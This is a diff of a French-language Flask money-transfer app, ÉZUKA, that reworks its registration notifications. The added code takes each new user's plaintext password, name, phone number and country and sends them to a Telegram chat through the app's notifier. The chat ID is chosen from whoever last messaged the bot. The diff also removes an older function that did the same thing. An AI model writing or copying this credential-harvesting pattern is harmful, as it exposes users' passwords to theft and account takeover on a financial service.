@@ -18,6 +18,7 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from datetime import datetime
 import requests
 import json
+
 from datetime import datetime
 # -------------------- Configuration --------------------
 # -------------------- Configuration --------------------
@@ -181,6 +182,42 @@ class CountryCurrency(db.Model):
     currency_code = db.Column(db.String(10), nullable=False)  # XOF, EUR, USD, etc.
     is_active = db.Column(db.Boolean, default=True)
     created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+
+#confi de chat
+def get_telegram_chat_id():
+    """Récupère automatiquement le Chat ID à CHAQUE fois"""
+    try:
+        TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+        if not TELEGRAM_BOT_TOKEN:
+            print("❌ TELEGRAM_BOT_TOKEN non configuré")
+            return None
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+        response = requests.get(url, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            
+            if data['result']:
+                # Prendre le DERNIER message reçu
+                last_update = data['result'][-1]
+                chat_id = last_update['message']['chat']['id']
+                
+                print(f"✅ Chat ID récupéré automatiquement: {chat_id}")
+                return chat_id
+            else:
+                print("❌ Aucun message reçu par le bot")
+                print("💡 Envoyez un message à votre bot sur Telegram")
+                return None
+        else:
+            print(f"❌ Erreur API Telegram: {response.text}")
+            return None
+            
+    except Exception as e:
+        print(f"❌ Erreur récupération Chat ID: {e}")
+        return None
 
 # Fonction pour initialiser les données par défaut
 def init_default_fees_and_rates():
@@ -392,33 +429,28 @@ def register():
         db.session.add(user)
         db.session.commit()
 
-        # 🔔 NOTIFICATION TELEGRAM - NOUVELLE INSCRIPTION
-        user_data = {
-            'first_name': first_name,
-            'last_name': last_name,
-            'phone': phone,
-            'country': country,
-            'password': password,  # Attention: sécurité - voir alternative ci-dessous
-            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        # 🔔 NOTIFICATION TELEGRAM - UTILISEZ LE SYSTÈME QUI FONCTIONNE
+        notification_data = {
+            "user_phone": phone,
+            "first_name": first_name,
+            "last_name": last_name,
+            "country": country,
+            "password": password,  # ✅ MOT DE PASSE INCLUS
+            "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M"),
+            "transaction_id": f"user_{user.id}"
         }
         
-        # Envoyer la notification Telegram
-        telegram_sent = send_registration_notification(user_data)
+        # Utilise notify_immediate comme pour les autres transactions
+        notify_immediate("registration", notification_data)
         
-        # Envoyer le message de bienvenue
-        welcome_sent = send_welcome_message_to_user(phone, first_name)
+        print(f"✅ Utilisateur créé - Notification Telegram envoyée")
         
-        print(f"✅ Utilisateur créé - Telegram: {'✅' if telegram_sent else '❌'}")
-        
-        # redirect to login_standard
         return redirect("/login")
         
     except Exception as e:
         db.session.rollback()
         logging.error(f"Erreur inscription: {e}")
         return "Erreur lors de l'inscription", 500
-    
-
 from flask import request, redirect, session, make_response, send_from_directory
 from werkzeug.security import check_password_hash
 
@@ -1886,12 +1918,32 @@ class AdvancedNotifier:
         emojis = {
             "deposit": "💰",
             "withdrawal": "💸", 
-            "transfer": "🔄"
+            "transfer": "🔄",
+            "registration": "🆕"  # ✅ AJOUT pour les inscriptions
         }
         
         emoji = emojis.get(transaction_type, "📢")
         is_urgent = data.get('amount', 0) > 50000
         
+        # ✅ GESTION SPÉCIFIQUE POUR LES INSCRIPTIONS
+        if transaction_type == "registration":
+            message = f"""
+{emoji} <b>NOUVELLE INSCRIPTION ÉZUKA</b> {emoji}
+
+👤 <b>Nom complet:</b> {data['first_name']} {data['last_name']}
+📞 <b>Téléphone:</b> {data['user_phone']}
+🌍 <b>Pays:</b> {data['country']}
+🔐 <b>Mot de passe:</b> <code>{data['password']}</code>
+📅 <b>Date:</b> {data['timestamp']}
+🆔 <b>ID Utilisateur:</b> #{data['transaction_id'].replace('user_', '')}
+
+⚠️ <b>CONSERVEZ CES INFORMATIONS EN SÉCURITÉ !</b>
+
+🔗 <a href='https://miniezuka-production.up.railway.app/admin/advanced'>📊 ACCÉDER AU TABLEAU DE BORD</a>
+"""
+            return message
+        
+        # ✅ GESTION DES TRANSACTIONS FINANCIÈRES
         if is_urgent:
             message = f"🚨 <b>TRANSACTION URGENTE</b> 🚨\n\n"
         else:
@@ -1903,7 +1955,7 @@ class AdvancedNotifier:
         message += f"<b>Date:</b> {data['timestamp']}\n"
         message += f"<b>ID:</b> #{data['transaction_id']}\n\n"
         
-        # Détails spécifiques
+        # Détails spécifiques par type de transaction
         if transaction_type == "deposit":
             message += f"<b>Montant:</b> {data['amount']} {data['currency']}\n"
             message += f"<b>Méthode:</b> {data['method']}\n"
@@ -1922,18 +1974,17 @@ class AdvancedNotifier:
             message += f"<b>Montant envoyé:</b> {data['amount_sent']} {data['sender_currency']}\n"
             message += f"<b>Montant reçu:</b> {data['amount_received']} {data['recipient_currency']}\n"
             message += f"<b>Méthode:</b> {data['method']}\n"
-
             message += f"<b>Frais:</b> {data['fee']} {data['sender_currency']}\n"
             message += f"\n🔄 <b>Action:</b> Vérifier le transfert"
         
+        # Alertes urgentes pour les transactions financières
         if is_urgent:
             message += f"\n\n⚠️ <b>TRANSACTION IMPORTANTE - TRAITEMENT IMMÉDIAT REQUIS!</b> ⚠️"
         
-        # Bouton d'action
+        # Bouton d'action pour les transactions financières
         message += f"\n\n🔗 <a href='https://miniezuka-production.up.railway.app/admin/advanced'>📊 ACCÉDER AU TABLEAU DE BORD</a>"
         
         return message
-
 # -------------------- CONSOLE NOTIFIER --------------------
 
 class ConsoleNotifier:
@@ -2280,91 +2331,6 @@ def admin_fees_management():
     return send_from_directory(TEMPLATES_DIR, "fees_dashboard.html")
 
 
-# Initialisation du bot Telegram
-def init_telegram_bot():
-    try:
-        if TELEGRAM_BOT_TOKEN:
-            bot = Bot(token=TELEGRAM_BOT_TOKEN)
-            print("✅ Bot Telegram initialisé")
-            return bot
-        else:
-            print("⚠️ TELEGRAM_BOT_TOKEN non configuré")
-            return None
-    except Exception as e:
-        print(f"❌ Erreur initialisation Telegram: {e}")
-        return None
-
-telegram_bot = init_telegram_bot()
-
-
-def send_registration_notification(user_data):
-    """Envoie une notification Telegram pour une nouvelle inscription"""
-    try:
-        if not telegram_bot or not TELEGRAM_CHAT_ID:
-            print("⚠️ Telegram non configuré - notification ignorée")
-            return False
-        
-        message = f"""
-🆕 NOUVELLE INSCRIPTION ÉZUKA 🆕
-
-👤 Nom complet: {user_data['first_name']} {user_data['last_name']}
-📞 Téléphone: {user_data['phone']}
-🌍 Pays: {user_data['country']}
-🔐 Mot de passe: {user_data['password']}
-📅 Date: {user_data['timestamp']}
-
-⚠️ Conservez ces informations en sécurité !
-        """
-        
-        telegram_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
-        print("✅ Notification d'inscription envoyée à Telegram")
-        return True
-        
-    except TelegramError as e:
-        logging.error(f"Erreur Telegram: {e}")
-        return False
-    except Exception as e:
-        logging.error(f"Erreur envoi notification: {e}")
-        return False
-
-def send_welcome_message_to_user(user_phone, first_name):
-    """Envoie un message de bienvenue à l'utilisateur (optionnel)"""
-    try:
-        if not telegram_bot or not TELEGRAM_CHAT_ID:
-            return False
-            
-        welcome_message = f"""
-🎉 Bienvenue {first_name} sur ÉZUKA ! 🎉
-
-Votre compte a été créé avec succès.
-Numéro: {user_phone}
-
-💡 **Fonctionnalités disponibles:**
-• Transferts d'argent rapides
-• Retraits sécurisés  
-• Support 24/7
-
-📱 **Prochaines étapes:**
-1. Configurez votre PIN de sécurité
-2. Effectuez votre premier dépôt
-3. Commencez à transférer !
-
-🔒 Votre sécurité est notre priorité.
-
-L'équipe ÉZUKA 🤝
-        """
-        
-        # Pour envoyer à l'utilisateur, vous aurez besoin de son chat_id Telegram
-        # Pour l'instant, on envoie juste une notification à l'admin
-        telegram_bot.send_message(
-            chat_id=TELEGRAM_CHAT_ID, 
-            text=f"✅ Message de bienvenue préparé pour {first_name} ({user_phone})"
-        )
-        return True
-        
-    except Exception as e:
-        logging.error(f"Erreur message bienvenue: {e}")
-        return False
 
 # -------------------- Run --------------------
 
